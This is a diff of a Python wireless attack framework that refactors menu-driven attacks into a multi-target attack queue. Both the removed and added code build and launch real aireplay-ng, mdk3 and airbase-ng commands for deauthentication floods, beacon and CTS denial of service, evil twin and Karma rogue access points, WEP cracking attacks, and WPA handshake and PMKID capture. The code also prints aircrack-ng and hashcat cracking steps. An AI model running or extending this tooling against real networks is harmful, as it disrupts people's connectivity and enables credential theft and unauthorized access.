-                    continue
-
-                # Detect station section
-                if 'Station MAC' in line:
-                    in_ap_section = False
-                    in_station_section = True
-                    continue
-
-                # Parse AP section
-                if in_ap_section:
-                    if 'BSSID' in line and 'ESSID' in line:
-                        header_found = True
-                        continue
-
-                    if header_found:
-                        fields = [f.strip() for f in line.split(',')]
-
-                        if len(fields) >= 14:
-                            bssid = fields[0]
-                            channel = fields[3]
-                            privacy = fields[5]
-                            power = fields[8]
-                            essid = fields[13] if fields[13] else '[Hidden]'
-
-                            if ':' in bssid and len(bssid) >= 17:
-                                networks.append({
-                                    'bssid': bssid,
-                                    'essid': essid,
-                                    'channel': channel,
-                                    'privacy': privacy,
-                                    'power': power
-                                })
-
-                # Parse Station section
-                elif in_station_section:
-                    fields = [f.strip() for f in line.split(',')]
-
-                    # Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
-                    if len(fields) >= 6:
-                        station_mac = fields[0]
-                        bssid = fields[5]
-
-                        # Only include associated clients (not "(not associated)")
-                        if ':' in station_mac and ':' in bssid and 'not associated' not in bssid.lower():
-                            if bssid not in clients:
-                                clients[bssid] = []
-                            if station_mac not in clients[bssid]:
-                                clients[bssid].append(station_mac)
-
-            # Store clients mapping
-            self.clients_by_bssid = clients
-            return networks
-
-        except Exception as e:
-            print(f"Error parsing CSV: {e}")
-            return []
-
-    def select_target_network(self):
-        """Select target network from airodump data"""
-        csv_file = self.find_airodump_csv()
-
-        if not csv_file:
-            print("\nNo airodump CSV files found in current directory.")
-            print("Run airodump-ng first to scan for networks.")
-            print("\nStarting Attack Framework in Captive Portal Mode")
-            print("(You can still use the default captive portal attack)")
-
-            # Set a placeholder target so the framework can continue
-            self.target_network = {
-                'essid': '[No Target Selected]',
-                'bssid': '00:00:00:00:00:00',
-                'channel': '6',
-                'privacy': 'OPN',
-                'power': '0'
-            }
-            self.discovered_networks = []
-            self.clients_by_bssid = {}
-            return True  # Return True to continue to main menu
-
-        print(f"\nReading networks from: {csv_file}")
-        self.discovered_networks = self.parse_airodump_csv(csv_file)
-
-        if not self.discovered_networks:
-            print("No networks found in CSV file.")
-            print("\nStarting Attack Framework in Captive Portal Mode")
-
-            self.target_network = {
-                'essid': '[No Target Selected]',
-                'bssid': '00:00:00:00:00:00',
-                'channel': '6',
-                'privacy': 'OPN',
-                'power': '0'
-            }
-            return True
-
-        print("\n" + "="*70)
-        print("DISCOVERED NETWORKS")
-        print("="*70)
-        print(f"{'#':<3} {'BSSID':<18} {'ESSID':<25} {'CH':<4} {'PWR':<5} {'SEC':<10}")
-        print("-"*70)
-
-        for i, net in enumerate(self.discovered_networks, 1):
-            print(f"{i:<3} {net['bssid']:<18} {net['essid']:<25} {net['channel']:<4} {net['power']:<5} {net['privacy']:<10}")
-
-        while True:
-            try:
-                choice = input("\nSelect target network (number): ").strip()
-                idx = int(choice) - 1
-                if 0 <= idx < len(self.discovered_networks):
-                    self.target_network = self.discovered_networks[idx]
-                    print(f"\nTarget set: {self.target_network['essid']} ({self.target_network['bssid']})")
-                    return True
-                else:
-                    print("Invalid selection.")
-            except (ValueError, KeyboardInterrupt):
-                print("\nCancelled.")
-                return False
-
-    def display_attack_menu(self):
-        """Display main attack menu"""
-        print("\n" + "="*60)
-        print("WIRELESS ATTACK MENU")
-        print("="*60)
-        print(f"Interface: {self.selected_interface}")
-        if self.target_network:
-            print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']}) CH:{self.target_network['channel']}")
-        print("-"*60)
-        print("1.  Deauthentication Attack")
-        print("2.  Denial of Service Attacks (submenu)")
-        print("3.  Evil Twin / Rogue AP")
-        print("4.  Karma/MANA Attack")
-        print("5.  Captive Portal Attack")
-        print("6.  PMKID Capture")
-        print("7.  WPA/WPA2 Handshake Capture")
-        print("8.  WEP Attacks (submenu)")
-        print("9.  Change Target Network")
-        print("10. Change Interface")
-        print("11. Exit")
-        print("-"*60)
-
-    def deauth_attack(self):
-        """Execute deauthentication attack"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        print("\n" + "="*50)
-        print("DEAUTHENTICATION ATTACK")
-        print("="*50)
-        print(f"Target: {self.target_network['essid']}")
-        print(f"BSSID: {self.target_network['bssid']}")
-        print(f"Channel: {self.target_network['channel']}")
-
-        # Get associated clients for this BSSID
-        target_bssid = self.target_network['bssid']
-        clients = self.clients_by_bssid.get(target_bssid, [])
-
-        print(f"\nAssociated clients: {len(clients)}")
-        if clients:
-            for i, client in enumerate(clients, 1):
-                print(f"  {i}. {client}")
-
-        # Attack type selection
-        print("\n1. Broadcast (all clients)")
-        if clients:
-            print("2. Specific client (from list above)")
-            print("3. Manual client MAC entry")
-        else:
-            print("2. Manual client MAC entry")
-
-        attack_type = input("Select attack type: ").strip()
-
-        client_mac = None
-        if attack_type == '2' and clients:
-            # Select from list
-            while True:
-                try:
-                    choice = input("Select client number: ").strip()
-                    idx = int(choice) - 1
-                    if 0 <= idx < len(clients):
-                        client_mac = clients[idx]
-                        break
-                    else:
-                        print("Invalid selection.")
-                except (ValueError, KeyboardInterrupt):
-                    print("Cancelled.")
-                    return
-        elif (attack_type == '3' and clients) or (attack_type == '2' and not clients):
-            # Manual entry
-            client_mac = input("Enter client MAC address: ").strip()
-
-        packet_count = input("Packet count (0 for continuous, default 10): ").strip() or "10"
-
-        # Set interface to target channel
-        channel = self.target_network['channel'].strip()
-        print(f"\nSetting interface to channel {channel}...")
-        try:
-            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
-                          check=True, capture_output=True)
-            print(f"Interface set to channel {channel}")
-        except subprocess.CalledProcessError as e:
-            print(f"Warning: Could not set channel: {e}")
-            print("Attack may fail if interface is on wrong channel.")
-
-        cmd = ['sudo', self.tool_paths['aireplay-ng'], '--deauth', packet_count,
-               '-a', self.target_network['bssid']]
-
-        if client_mac:
-            cmd.extend(['-c', client_mac])
-
-        cmd.append(self.selected_interface)
-
-        print(f"\nLaunching attack...")
-        print(f"Command: {' '.join(cmd)}")
-        print("Press Ctrl+C to stop\n")
-
-        try:
-            subprocess.run(cmd)
-            print("\nAttack completed.")
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def check_mdk3_and_guide(self):
-        """Check for mdk3 and provide installation guidance"""
-        if 'mdk3' not in self.tool_paths:
-            mdk3_path = self.find_tool('mdk3')
-            if mdk3_path:
-                self.tool_paths['mdk3'] = mdk3_path
-                self.save_config()
-                print(f"Found mdk3 at: {mdk3_path}")
-                return True
-            else:
-                print("\n" + "="*60)
-                print("MDK3 NOT INSTALLED")
-                print("="*60)
-                print("mdk3 is required for Authentication DoS and Beacon Flood attacks.")
-                print("\nTo install mdk3, run these commands:")
-                print("-" * 60)
-                print("sudo apt-get install build-essential libpcap-dev")
-                print("git clone https://github.com/charlesxsh/mdk3-master.git")
-                print("cd mdk3-master")
-                print("make")
-                print("sudo make install")
-                print("-" * 60)
-                print("\nAfter installation, restart this script.")
-                input("\nPress Enter to continue...")
-                return False
+    def _enable_monitor_mode(self, interface: str) -> bool:
+        mon = self.iface_mgr.enable_monitor_mode(interface)
+        if not mon:
+            return False
+        print(f"Capture interface ready: {mon}")
         return True
 
-    def auth_dos_attack(self):
-        """Execute authentication DoS attack"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        # Check if mdk3 is available
-        if not self.check_mdk3_and_guide():
-            return
-
-        print("\n" + "="*50)
-        print("AUTHENTICATION DOS ATTACK")
-        print("="*50)
-        print(f"Target: {self.target_network['essid']}")
-        print(f"BSSID: {self.target_network['bssid']}")
-
-        cmd = ['sudo', self.tool_paths['mdk3'], self.selected_interface, 'a',
-               '-a', self.target_network['bssid']]
-
-        print(f"\nLaunching attack...")
-        print("Press Ctrl+C to stop\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def beacon_flood_attack(self):
-        """Execute beacon flood attack"""
-        # Check if mdk3 is available
-        if not self.check_mdk3_and_guide():
-            return
-
-        print("\n" + "="*50)
-        print("BEACON FLOOD ATTACK")
-        print("="*50)
-
-        essid_count = input("Number of fake APs (default 50): ").strip() or "50"
-
-        cmd = ['sudo', self.tool_paths['mdk3'], self.selected_interface, 'b',
-               '-n', essid_count, '-s', '1000']
-
-        print(f"\nLaunching beacon flood...")
-        print("Press Ctrl+C to stop\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def evil_twin_attack(self):
-        """Execute evil twin / rogue AP attack"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        print("\n" + "="*50)
-        print("EVIL TWIN / ROGUE AP ATTACK")
-        print("="*50)
-        print(f"Cloning: {self.target_network['essid']}")
-        print(f"Channel: {self.target_network['channel']}")
-
-        cmd = ['sudo', self.tool_paths['airbase-ng'],
-               '-e', self.target_network['essid'],
-               '-c', self.target_network['channel'],
-               '-a', self.target_network['bssid'],
-               self.selected_interface]
-
-        print(f"\nLaunching evil twin AP...")
-        print("Press Ctrl+C to stop\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def captive_portal_attack(self):
-        """Execute captive portal attack"""
-        print("\n" + "="*50)
-        print("CAPTIVE PORTAL ATTACK")
-        print("="*50)
-        print("This attack requires additional setup:")
-        print("1. Clone target portal with httrack")
-        print("2. Modify forms to capture credentials")
-        print("3. Setup web server, DNS, and DHCP")
-        print("\nThis is a complex attack - implement manually or use specialized tools.")
-        input("\nPress Enter to continue...")
-
-    def dos_attacks_menu(self):
-        """Denial of Service attacks submenu"""
-        while True:
-            print("\n" + "="*60)
-            print("DENIAL OF SERVICE ATTACKS")
-            print("="*60)
-            if self.target_network:
-                print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']})")
-            print("-"*60)
-            print("1. Authentication DoS (mdk3)")
-            print("2. Beacon Flood (mdk3)")
-            print("3. CTS Frame Flood")
-            print("4. Back to main menu")
-            print("-"*60)
-
-            choice = input("\nSelect DoS attack (1-4): ").strip()
-
-            if choice == '1':
-                self.auth_dos_attack()
-            elif choice == '2':
-                self.beacon_flood_attack()
-            elif choice == '3':
-                self.cts_flood_attack()
-            elif choice == '4':
-                break
-            else:
-                print("Invalid selection.")
-
-    def wep_attacks_menu(self):
-        """WEP attacks submenu"""
-        while True:
-            print("\n" + "="*60)
-            print("WEP ATTACKS (Legacy Networks)")
-            print("="*60)
-            if self.target_network:
-                print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']})")
-            print("-"*60)
-            print("1. Fake Authentication")
-            print("2. ARP Replay Attack")
-            print("3. Fragmentation Attack")
-            print("4. ChopChop Attack")
-            print("5. Crack WEP Key (aircrack-ng)")
-            print("6. Back to main menu")
-            print("-"*60)
-
-            choice = input("\nSelect WEP attack (1-6): ").strip()
-
-            if choice == '1':
-                self.wep_fake_auth()
-            elif choice == '2':
-                self.wep_arp_replay()
-            elif choice == '3':
-                self.wep_fragmentation()
-            elif choice == '4':
-                self.wep_chopchop()
-            elif choice == '5':
-                self.wep_crack()
-            elif choice == '6':
-                break
-            else:
-                print("Invalid selection.")
-
-    def karma_attack(self):
-        """Execute Karma/MANA attack"""
-        print("\n" + "="*50)
-        print("KARMA/MANA ATTACK")
-        print("="*50)
-        print("This attack responds to all client probe requests,")
-        print("tricking devices into connecting to your fake AP.")
-
-        essid = input("\nFake AP ESSID (or press Enter for 'FreeWiFi'): ").strip() or "FreeWiFi"
-        channel = input("Channel (1-11, default 6): ").strip() or "6"
-
-        print("\nKarma attack creates an AP that responds to all probe requests.")
-        print("Clients searching for networks may auto-connect.")
-
-        # Use airbase-ng with -P flag for probe response
-        cmd = ['sudo', self.tool_paths['airbase-ng'],
-               '-e', essid,
-               '-c', channel,
-               '-P',  # Respond to all probes
-               self.selected_interface]
-
-        print(f"\nLaunching Karma attack...")
-        print(f"ESSID: {essid}")
-        print(f"Channel: {channel}")
-        print("Press Ctrl+C to stop\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def cts_flood_attack(self):
-        """CTS frame flood attack"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        print("\n" + "="*50)
-        print("CTS FRAME FLOOD ATTACK")
-        print("="*50)
-        print(f"Target Channel: {self.target_network['channel']}")
-        print("\nThis floods the channel with CTS frames,")
-        print("blocking all communication.")
-
-        # Check if mdk3 is available
-        if not self.check_mdk3_and_guide():
-            return
-
-        cmd = ['sudo', self.tool_paths['mdk3'],
-               self.selected_interface, 'c',
-               '-c', self.target_network['channel']]
-
-        print(f"\nLaunching CTS flood on channel {self.target_network['channel']}...")
-        print("Press Ctrl+C to stop\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def wep_fake_auth(self):
-        """WEP fake authentication"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        print("\n" + "="*50)
-        print("WEP FAKE AUTHENTICATION")
-        print("="*50)
-        print(f"Target: {self.target_network['essid']}")
-        print(f"BSSID: {self.target_network['bssid']}")
-
-        # Set channel
-        channel = self.target_network['channel'].strip()
-        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
-                      capture_output=True)
-
-        cmd = ['sudo', self.tool_paths['aireplay-ng'],
-               '-1', '0',  # Fake auth
-               '-a', self.target_network['bssid'],
-               self.selected_interface]
-
-        print(f"\nAttempting fake authentication...")
-        print("This associates with the AP for packet injection.\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def wep_arp_replay(self):
-        """WEP ARP replay attack"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        print("\n" + "="*50)
-        print("WEP ARP REPLAY ATTACK")
-        print("="*50)
-        print(f"Target: {self.target_network['essid']}")
-        print(f"BSSID: {self.target_network['bssid']}")
-        print("\nThis captures and replays ARP packets to generate IVs.")
-
-        # Set channel
-        channel = self.target_network['channel'].strip()
-        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
-                      capture_output=True)
-
-        cmd = ['sudo', self.tool_paths['aireplay-ng'],
-               '-3',  # ARP replay
-               '-b', self.target_network['bssid'],
-               self.selected_interface]
-
-        print(f"\nLaunching ARP replay...")
-        print("Waiting for ARP packet...\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def wep_fragmentation(self):
-        """WEP fragmentation attack"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        print("\n" + "="*50)
-        print("WEP FRAGMENTATION ATTACK")
-        print("="*50)
-        print(f"Target: {self.target_network['essid']}")
-        print(f"BSSID: {self.target_network['bssid']}")
-
-        # Set channel
-        channel = self.target_network['channel'].strip()
-        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
-                      capture_output=True)
-
-        cmd = ['sudo', self.tool_paths['aireplay-ng'],
-               '-5',  # Fragmentation
-               '-b', self.target_network['bssid'],
-               self.selected_interface]
-
-        print(f"\nLaunching fragmentation attack...")
-        print("This obtains keystream for packet injection.\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def wep_chopchop(self):
-        """WEP chopchop attack"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        print("\n" + "="*50)
-        print("WEP CHOPCHOP ATTACK")
-        print("="*50)
-        print(f"Target: {self.target_network['essid']}")
-        print(f"BSSID: {self.target_network['bssid']}")
-
-        # Set channel
-        channel = self.target_network['channel'].strip()
-        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
-                      capture_output=True)
-
-        cmd = ['sudo', self.tool_paths['aireplay-ng'],
-               '-4',  # Chopchop
-               '-b', self.target_network['bssid'],
-               self.selected_interface]
-
-        print(f"\nLaunching chopchop attack...")
-        print("This decrypts WEP packets without the key.\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nAttack stopped.")
-
-    def wep_crack(self):
-        """Crack WEP key from capture"""
-        print("\n" + "="*50)
-        print("CRACK WEP KEY")
-        print("="*50)
-
-        cap_file = input("Enter capture file name (.cap): ").strip()
-
-        if not Path(cap_file).exists():
-            print(f"File {cap_file} not found.")
-            return
-
-        cmd = ['sudo', self.tool_paths['aircrack-ng'], cap_file]
-
-        print(f"\nCracking WEP key from {cap_file}...")
-        print("This requires at least 40,000-85,000 IVs.\n")
-
-        try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            print("\nCracking stopped.")
-
-    def wpa_handshake_capture(self):
-        """Capture WPA/WPA2 4-way handshake"""
-        if not self.target_network:
-            print("No target selected.")
-            return
-
-        print("\n" + "="*50)
-        print("WPA/WPA2 HANDSHAKE CAPTURE")
-        print("="*50)
-        print(f"Target: {self.target_network['essid']}")
-        print(f"BSSID: {self.target_network['bssid']}")
-        print(f"Channel: {self.target_network['channel']}")
-
-        # Get associated clients
-        target_bssid = self.target_network['bssid']
-        clients = self.clients_by_bssid.get(target_bssid, [])
-
-        if clients:
-            print(f"\nAssociated clients found: {len(clients)}")
-            for i, client in enumerate(clients, 1):
-                print(f"  {i}. {client}")
+    def _setup_interfaces(self) -> bool:
+        """
+        Select and enable monitor mode on one or two interfaces.
+        Returns False if the primary interface setup fails.
+        """
+        print("\n" + "=" * 60)
+        print(" INTERFACE SETUP")
+        print("=" * 60)
+        print(" Interface 1 (PRIMARY) : scanning + capture")
+        print(" Interface 2 (ATTACK)  : transmitting deauth/evil twin")
+        print("=" * 60)
+
+        # Primary interface
+        print("\n-- Primary Interface (capture / scan) --")
+        iface1 = self._select_physical_interface()
+        if not iface1:
+            return False
+        if not self._enable_monitor_mode(iface1):
+            print("Cannot continue without primary monitor interface.")
+            return False
+
+        # Secondary interface - optional
+        remaining = [i for i in self.iface_mgr.get_available_interfaces()
+                     if i != iface1
+                     and i != self.iface_mgr.monitor_interface]
+        if remaining:
+            print("\n-- Secondary Interface (attack / transmit) --")
+            print(f"  Available: {', '.join(remaining)}")
+            use_second = input(
+                "Configure second interface for dedicated attacks? (y/n): "
+            ).strip().lower()
+            if use_second == 'y':
+                iface2 = self._select_physical_interface(
+                    exclude=self.iface_mgr.monitor_interface
+                )
+                if iface2:
+                    mon2 = self.iface_mgr.enable_monitor_mode_2(iface2)
+                    if mon2:
+                        print(f"Attack interface ready: {mon2}")
+                    else:
+                        print("Warning: second interface setup failed - "
+                              "continuing in single-interface mode.")
         else:
-            print("\nNo associated clients found in CSV.")
-            print("You may need to wait for a client to connect,")
-            print("or use deauth attack to force re-authentication.")
+            print("\nOnly one wireless interface detected - "
+                  "running in single-interface mode.")
 
-        output_file = f"handshake_{self.target_network['bssid'].replace(':', '')}"
+        # Summary
+        print(f"\n{'='*60}")
+        print(f" Capture interface : {self.iface_mgr.capture_interface}")
+        if self.iface_mgr.dual_interface:
+            print(f" Attack interface  : {self.iface_mgr.attack_interface}")
+            print(f" Mode              : DUAL INTERFACE")
+        else:
+            print(f" Mode              : SINGLE INTERFACE")
+        print(f"{'='*60}")
+        return True
 
-        print(f"\nCapture will be saved to: {output_file}")
-        print("\nOptions:")
-        print("1. Passive capture (wait for natural authentication)")
-        print("2. Active capture (deauth client to force re-auth)")
+    # ------------------------------------------------------------------
+    # Attack queue builder
+    # ------------------------------------------------------------------
 
-        choice = input("\nSelect capture mode (1-2): ").strip()
-
-        if choice == '2':
-            if not clients:
-                print("\nNo clients to deauth. Running passive capture instead.")
-                choice = '1'
+    def _build_attack_queue(self):
+        """Interactive loop to build the attack queue for selected targets."""
+        while True:
+            print("\n" + "=" * 60)
+            print("ATTACK QUEUE BUILDER")
+            print("=" * 60)
+            if self.iface_mgr.dual_interface:
+                print(f" Capture : {self.iface_mgr.capture_interface}"
+                      "  |  Attack : "
+                      f"{self.iface_mgr.attack_interface}  [DUAL]")
             else:
-                # Ask which client to deauth
-                print("\nSelect client to deauthenticate:")
-                print("0. All clients (broadcast)")
-                for i, client in enumerate(clients, 1):
-                    print(f"{i}. {client}")
+                print(f" Interface: {self.iface_mgr.capture_interface}"
+                      "  [SINGLE]")
+            print(f" Targets : {', '.join(t['essid'] for t in self.selected_targets)}")
+            self.attack_queue.display()
+            print("\n" + "-" * 60)
+            print("ADD ATTACK:")
+            print("  1.  Deauthentication")
+            print("  2.  DoS - Authentication Flood (mdk3)")
+            print("  3.  DoS - Beacon Flood (mdk3)")
+            print("  4.  DoS - CTS Frame Flood (mdk3)")
+            print("  5.  Evil Twin / Rogue AP")
+            print("  6.  Karma / MANA Attack")
+            print("  7.  Captive Portal - Default")
+            print("  8.  Captive Portal - Clone Target")
+            print("  9.  PMKID Capture")
+            print(" 10.  WPA/WPA2 Handshake Capture")
+            print(" 11.  WPA Handshake + Deauth (Combo)")
+            print(" 12.  Evil Twin + Captive Portal (Combo)")
+            print(" 13.  WEP Fake Authentication")
+            print(" 14.  WEP ARP Replay")
+            print(" 15.  WEP Fragmentation")
+            print(" 16.  WEP ChopChop")
+            print(" 17.  Crack WEP Key")
+            print("-" * 60)
+            print("  E.  Execute queue")
+            print("  C.  Clear queue")
+            print("  R.  Re-scan (change targets)")
+            print("  Q.  Quit")
+            print("-" * 60)
 
-                client_choice = input("\nSelect client (0 for all): ").strip()
+            choice = input("\nSelect option: ").strip().upper()
 
-                if client_choice == '0':
-                    deauth_target = None  # Broadcast
+            attack_map = {
+                '1':  'deauth',
+                '2':  'auth_dos',
+                '3':  'beacon_flood',
+                '4':  'cts_flood',
+                '5':  'evil_twin',
+                '6':  'karma',
+                '7':  'captive_portal_default',
+                '8':  'captive_portal_clone',
+                '9':  'pmkid_capture',
+                '10': 'wpa_handshake',
+                '11': 'deauth_handshake',
+                '12': 'evil_twin_portal',
+                '13': 'wep_fake_auth',
+                '14': 'wep_arp_replay',
+                '15': 'wep_fragmentation',
+                '16': 'wep_chopchop',
+                '17': 'wep_crack',
+            }
+
+            if choice in attack_map:
+                attack_type = attack_map[choice]
+                for target in self.selected_targets:
+                    self.attack_queue.add(target, attack_type)
+                print(f"Added '{attack_type}' for {len(self.selected_targets)} target(s).")
+
+            elif choice == 'E':
+                if len(self.attack_queue) == 0:
+                    print("Queue is empty.")
                 else:
-                    try:
-                        idx = int(client_choice) - 1
-                        if 0 <= idx < len(clients):
-                            deauth_target = clients[idx]
-                        else:
-                            print("Invalid selection, using broadcast.")
-                            deauth_target = None
-                    except ValueError:
-                        print("Invalid input, using broadcast.")
-                        deauth_target = None
+                    self._execute_queue()
 
-        # Set interface to target channel
-        channel = self.target_network['channel'].strip()
-        print(f"\nSetting interface to channel {channel}...")
-        try:
-            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
-                          check=True, capture_output=True)
-        except subprocess.CalledProcessError:
-            print("Warning: Could not set channel")
+            elif choice == 'C':
+                self.attack_queue.clear()
+                print("Queue cleared.")
 
-        # Start airodump capture
-        airodump_cmd = ['sudo', self.tool_paths['airodump-ng'],
-                       '-c', channel,
-                       '--bssid', self.target_network['bssid'],
-                       '-w', output_file,
-                       self.selected_interface]
+            elif choice == 'R':
+                return 'rescan'
 
-        print(f"\nStarting handshake capture...")
-        print("Waiting for WPA handshake...")
+            elif choice == 'Q':
+                return 'quit'
 
-        if choice == '2':
-            print("\nCapture started. Will deauth client in 5 seconds...")
-            print("Watch for 'WPA handshake' message in airodump output")
-            print("Press Ctrl+C when handshake is captured\n")
+    # ------------------------------------------------------------------
+    # Queue execution
+    # ------------------------------------------------------------------
 
-            # Start airodump in background
-            import threading
-            airodump_proc = subprocess.Popen(airodump_cmd)
-
-            # Wait 5 seconds for airodump to start
-            time.sleep(5)
-
-            # Send deauth packets
-            print("Sending deauth packets...")
-            deauth_cmd = ['sudo', self.tool_paths['aireplay-ng'],
-                         '--deauth', '5',
-                         '-a', self.target_network['bssid']]
-
-            if deauth_target:
-                deauth_cmd.extend(['-c', deauth_target])
-
-            deauth_cmd.append(self.selected_interface)
-
-            try:
-                subprocess.run(deauth_cmd, timeout=10)
-            except:
-                pass
-
-            print("\nDeauth sent. Waiting for handshake...")
-            print("Press Ctrl+C when you see 'WPA handshake' message\n")
-
-            try:
-                airodump_proc.wait()
-            except KeyboardInterrupt:
-                airodump_proc.terminate()
-                airodump_proc.wait()
-        else:
-            # Passive mode
-            print("\nPress Ctrl+C when handshake is captured\n")
-            try:
-                subprocess.run(airodump_cmd)
-            except KeyboardInterrupt:
-                pass
-
-        print(f"\nCapture saved to: {output_file}-01.cap")
-        print("\nTo crack the handshake:")
-        print(f"  aircrack-ng -w /path/to/wordlist.txt {output_file}-01.cap")
-        print(f"  hashcat -m 22000 {output_file}.hc22000 /path/to/wordlist.txt")
-
-    def pmkid_capture(self):
-        """Capture PMKID for WPA/WPA2 cracking"""
-        if not self.target_network:
-            print("No target selected.")
+    def _execute_queue(self):
+        print("\n" + "=" * 60)
+        print("EXECUTING ATTACK QUEUE")
+        print("=" * 60)
+        self.attack_queue.display()
+        confirm = input("\nProceed? (y/n): ").strip().lower()
+        if confirm != 'y':
             return
 
-        print("\n" + "="*50)
-        print("PMKID CAPTURE")
-        print("="*50)
-        print(f"Target: {self.target_network['essid']}")
-        print(f"BSSID: {self.target_network['bssid']}")
+        dispatch = {
+            'deauth':                  self._attack_deauth,
+            'auth_dos':                self._attack_auth_dos,
+            'beacon_flood':            self._attack_beacon_flood,
+            'cts_flood':               self._attack_cts_flood,
+            'evil_twin':               self._attack_evil_twin,
+            'karma':                   self._attack_karma,
+            'captive_portal_default':  self._attack_captive_portal_default,
+            'captive_portal_clone':    self._attack_captive_portal_clone,
+            'pmkid_capture':           self._attack_pmkid_capture,
+            'wpa_handshake':           self._attack_wpa_handshake,
+            'deauth_handshake':        self._combo_deauth_handshake,
+            'evil_twin_portal':        self._combo_evil_twin_portal,
+            'wep_fake_auth':           self._attack_wep_fake_auth,
+            'wep_arp_replay':          self._attack_wep_arp_replay,
+            'wep_fragmentation':       self._attack_wep_fragmentation,
+            'wep_chopchop':            self._attack_wep_chopchop,
+            'wep_crack':               self._attack_wep_crack,
+        }
 
-        output_file = f"pmkid_{self.target_network['bssid'].replace(':', '')}"
+        for i, item in enumerate(self.attack_queue, 1):
+            target      = item['target']
+            attack_type = item['attack_type']
+            print(f"\n[{i}/{len(self.attack_queue)}] {attack_type} → {target['essid']}")
 
-        cmd = ['sudo', self.tool_paths['airodump-ng'],
-               '-c', self.target_network['channel'],
-               '--bssid', self.target_network['bssid'],
-               '-w', output_file,
-               self.selected_interface]
+            fn = dispatch.get(attack_type)
+            if fn:
+                try:
+                    fn(target, item['params'])
+                except KeyboardInterrupt:
+                    print("\nAttack interrupted.")
+                    cont = input("Continue with next item? (y/n): ").strip().lower()
+                    if cont != 'y':
+                        break
+            else:
+                print(f"Unknown attack type: {attack_type}")
 
-        print(f"\nCapturing PMKID...")
-        print("Press Ctrl+C when capture is complete\n")
+        self.attack_queue.clear()
+        print("\nQueue execution complete.")
 
+    # ------------------------------------------------------------------
+    # Individual attacks
+    # ------------------------------------------------------------------
+
+    def _set_target_channel(self, target: dict):
+        """Set both monitor interfaces to the target channel."""
+        channel = target.get('channel', '6').strip()
+        if self.iface_mgr.capture_interface:
+            self.iface_mgr.set_channel(self.iface_mgr.capture_interface, channel)
+        if self.iface_mgr.dual_interface:
+            self.iface_mgr.set_channel(self.iface_mgr.attack_interface, channel)
+
+    def _attack_deauth(self, target: dict, params: dict):
+        iface = self.iface_mgr.attack_interface
+        if not iface:
+            print("No monitor interface available.")
+            return
+
+        aireplay = self._require_tool('aireplay-ng')
+        if not aireplay:
+            return
+
+        print(f"\nDEAUTHENTICATION ATTACK")
+        print(f"Target  : {target['essid']} ({target['bssid']})")
+        print(f"TX iface: {iface}"
+              + (" [dedicated attack interface]" if self.iface_mgr.dual_interface else ""))
+
+        _, clients_by_bssid = self.scan_engine.get_snapshot() if self.scan_engine else ({}, {})
+        clients = clients_by_bssid.get(target['bssid'], [])
+
+        print(f"Associated clients: {len(clients)}")
+        for i, c in enumerate(clients, 1):
+            print(f"  {i}. {c}")
+
+        print("\n1. Broadcast (all clients)")
+        if clients:
+            print("2. Select client from list")
+            print("3. Manual MAC entry")
+        else:
+            print("2. Manual MAC entry")
+
+        attack_type = input("Select (default 1): ").strip() or '1'
+        client_mac  = None
+
+        if attack_type == '2' and clients:
+            try:
+                idx = int(input("Client number: ").strip()) - 1
+                if 0 <= idx < len(clients):
+                    client_mac = clients[idx]
+            except ValueError:
+                pass
+        elif (attack_type == '3' and clients) or (attack_type == '2' and not clients):
+            client_mac = input("Enter client MAC: ").strip()
+
+        count = input("Packet count (0=continuous, default 10): ").strip() or '10'
+
+        self._set_target_channel(target)
+
+        cmd = ['sudo', aireplay, '--deauth', count, '-a', target['bssid']]
+        if client_mac:
+            cmd += ['-c', client_mac]
+        cmd.append(iface)
+
+        print(f"\nRunning: {' '.join(cmd)}")
+        print("Press Ctrl+C to stop\n")
         try:
             subprocess.run(cmd)
-            print(f"\nCapture saved to: {output_file}")
         except KeyboardInterrupt:
-            print("\nCapture stopped.")
+            print("\nStopped.")
 
-    def wps_attacks(self):
-        """WPS attack menu"""
-        if not self.target_network:
-            print("No target selected.")
+    def _attack_auth_dos(self, target: dict, params: dict):
+        mon = self.iface_mgr.monitor_interface
+        mdk3 = self._require_tool('mdk3')
+        if not mdk3:
             return
 
-        print("\n" + "="*50)
-        print("WPS ATTACKS")
-        print("="*50)
-        print("WPS attacks require additional tools (reaver, bully, etc.)")
-        print("Install these tools separately for WPS functionality.")
-        input("\nPress Enter to continue...")
+        print(f"\nAUTHENTICATION DoS ATTACK → {target['essid']}")
